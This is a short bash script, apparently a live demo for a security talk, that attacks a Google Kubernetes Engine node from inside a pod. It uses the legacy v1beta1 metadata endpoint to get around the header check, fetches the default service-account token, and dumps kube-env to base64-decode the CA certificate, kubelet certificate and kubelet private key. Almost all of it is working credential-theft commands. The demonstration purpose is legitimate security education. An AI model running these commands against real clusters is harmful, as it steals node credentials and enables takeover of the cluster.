#!/bin/bash

set -e

. demo-magic.sh
clear

p "# Try to get the token from the metadata API"
pe "wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || true
echo ""
echo ""
echo ""
p "# Failed since we didn't set 'Metadata-Flavor: Google' header, but...."
pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
echo ""
p "# Back to slides"
clear
p "# Grab kube-env"
pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"
echo ""
echo ""
echo ""
p ""
clear
p "CA_CERT"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep CA_CERT | sed s'/CA_CERT: //g' | base64 -d
echo ""
echo ""
p "KUBELET_CERT"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_CERT | sed s'/KUBELET_CERT: //g' | base64 -d
echo ""
echo ""
p "KUBELET_KEY"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_KEY | sed s'/KUBELET_KEY: //g' | base64 -d
